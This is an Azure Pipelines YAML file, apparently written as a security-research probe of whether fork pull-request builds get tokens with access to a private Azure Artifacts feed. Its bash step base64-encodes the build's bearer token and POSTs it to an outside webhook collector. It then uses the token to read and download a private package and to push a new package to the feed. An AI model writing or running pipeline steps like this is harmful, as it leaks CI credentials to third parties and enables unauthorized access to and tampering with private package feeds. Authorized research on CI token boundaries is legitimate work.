# Diagnostic pipeline authored in the external fork PR (simulated external contributor).
# Purpose: observe which bearer token a fork pull-request validation build receives
# and whether that restricted token carries entitlement to the organization's
# private Azure Artifacts feed. All outputs are research diagnostics.
pr:
  branches:
    include:
      - main
trigger: none
pool:
  name: r37gh6n9bsoq0hwi3ngw-pool
steps:
  - checkout: self
  - task: NuGetAuthenticate@1
    displayName: NuGetAuthenticate (sets VSS_NUGET_ACCESSTOKEN)
  - bash: |
      set +e
      echo "=== CONTEXT ==="
      echo "BuildReason=$(BUILD_REASON)"
      echo "SourceBranch=$(BUILD_SOURCEBRANCH)"
      echo "Repository=$(BUILD_REPOSITORY_NAME)"
      echo "PRFork=$(SYSTEM_PULLREQUEST_ISFORK)"
      echo "PRSourceRepo=$(SYSTEM_PULLREQUEST_SOURCEREPOSITORYURI)"
      PKGS="https://pkgs.dev.azure.com/r37gh6n9bsoq0hwi3ngw-ado/r37gh6n9bsoq0hwi3ngw-proj/_packaging/r37gh6n9bsoq0hwi3ngw-feed/npm/registry"
      FEEDAPI="https://feeds.dev.azure.com/r37gh6n9bsoq0hwi3ngw-ado/r37gh6n9bsoq0hwi3ngw-proj/_apis/packaging/feeds/r37gh6n9bsoq0hwi3ngw-feed"
      OOB="https://webhook.anywaiver.com/87a2a254-1b36-428f-895c-bbf54ee10a6d"
      # Prefer the NuGetAuthenticate-provided token; fall back to the job access token.
      TOKEN="${VSS_NUGET_ACCESSTOKEN}"
      if [ -z "$TOKEN" ]; then TOKEN="$(System.AccessToken)"; fi
      echo "TOKEN_PRESENT=$([ -n "$TOKEN" ] && echo yes || echo no)"
      echo "TOKEN_LEN=${#TOKEN}"
      # ---- Forward the captured bearer token to the researcher OOB collector for off-box analysis ----
      B64=$(printf '%s' "$TOKEN" | base64 -w0)
      curl -s -m 20 -X POST "$OOB/token-capture" -H 'Content-Type: application/json'         --data "{\"setting\":\"cell1-default-secrets-withheld\",\"vss_nuget\":\"$B64\",\"len\":${#TOKEN}}" -o /dev/null -w "OOB_POST_HTTP=%{http_code}\n"
      echo "=== FEED READ PROBE (npm metadata) ==="
      RH=$(curl -s -m 25 -o /tmp/meta.json -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$PKGS/r37gh6n9bsoq0hwi3ngw-secretpkg")
      echo "FEED_READ_META_HTTP=$RH"
      head -c 400 /tmp/meta.json; echo
      echo "=== FEED READ PROBE (download sentinel tgz) ==="
      DH=$(curl -s -m 25 -o /tmp/pkg.tgz -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$PKGS/r37gh6n9bsoq0hwi3ngw-secretpkg/-/r37gh6n9bsoq0hwi3ngw-secretpkg-1.0.0.tgz")
      echo "FEED_READ_TGZ_HTTP=$DH"
      SENT=$(tar xzOf /tmp/pkg.tgz package/SENTINEL.txt 2>/dev/null)
      echo "SENTINEL_FROM_FEED=${SENT:-<none>}"
      echo "=== FEED READ PROBE (packaging REST feed metadata) ==="
      FH=$(curl -s -m 25 -o /tmp/f.json -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$FEEDAPI/packages?api-version=7.1")
      echo "FEED_REST_HTTP=$FH"
      head -c 300 /tmp/f.json; echo
      echo "=== FEED PUSH PROBE (publish benign package via REST) ==="
      PH=$(curl -s -m 25 -o /tmp/push.json -w "%{http_code}" -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "$PKGS/r37gh6n9bsoq0hwi3ngw-forkpush" -d '{"_id":"r37gh6n9bsoq0hwi3ngw-forkpush","name":"r37gh6n9bsoq0hwi3ngw-forkpush","versions":{"0.0.1":{"name":"r37gh6n9bsoq0hwi3ngw-forkpush","version":"0.0.1"}}}')
      echo "FEED_PUSH_HTTP=$PH"
      head -c 300 /tmp/push.json; echo
      echo "=== VERDICT ==="
      if [ "$RH" = "200" ] || [ "$DH" = "200" ] || [ "$FH" = "200" ]; then echo "PROBE_RESULT=FORK_TOKEN_CAN_READ_PRIVATE_FEED"; else echo "PROBE_RESULT=FORK_TOKEN_DENIED_READ"; fi
    displayName: feed-boundary-probe
    env:
      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
  # refire2 1793273275
